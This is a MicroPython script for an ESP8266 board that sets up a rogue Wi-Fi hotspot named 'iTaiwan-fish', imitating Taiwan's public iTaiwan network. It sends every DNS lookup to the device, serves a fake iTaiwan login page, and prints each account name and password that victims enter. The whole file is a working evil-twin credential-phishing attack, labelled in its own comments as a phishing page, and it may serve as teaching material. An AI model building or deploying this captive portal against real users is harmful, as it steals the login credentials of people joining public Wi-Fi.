# %% 匯入必要的模組
import ESP8266WebServer
import network
from DNSServer import DNSServer

# %% 建立名稱為 "iTaiwan-fish " 的 Wi-Fi 熱點
ap_if = network.WLAN(network.AP_IF)
if not ap_if.active():
    ap_if.active(True)
ap_if.config(essid="iTaiwan-fish")

# %% 建立DNS 伺服器, 並將所有域名導向 D1 mini 的 IP
dnsserver = DNSServer()
dnsserver.start(53, "*", "192.168.4.1")  # 通常 DNS 伺服器的 port 為 53
# * 代表所有的域名

# %% 設計處理網頁請求的函式, 並設置釣魚網頁
def handleNotFound(socket):
    ESP8266WebServer.ok(socket, "200", "/itaiwan.html")

def handleLogin(socket, args):
    if 'usn' in args and 'pwd' in args:
        print("帳號:",args['usn'],", 密碼:",args['pwd'])
        ESP8266WebServer.ok(
        socket, 
        "200",
        "<HTML><HEAD><meta http-equiv='refresh' content='0;url=/' /></HEAD></HTML>"
        )
    else:
        ESP8266WebServer.err(socket, "400", "Bad Request")
        
# %% 啟用網站
ESP8266WebServer.begin(80)
ESP8266WebServer.onPath("/login", handleLogin)
ESP8266WebServer.onNotFound(handleNotFound)

while True:
    ESP8266WebServer.handleClient()  # 讓網站不斷接收請求
    dnsserver.processNextRequest()   # 讓 DNS 伺服器不斷處理請求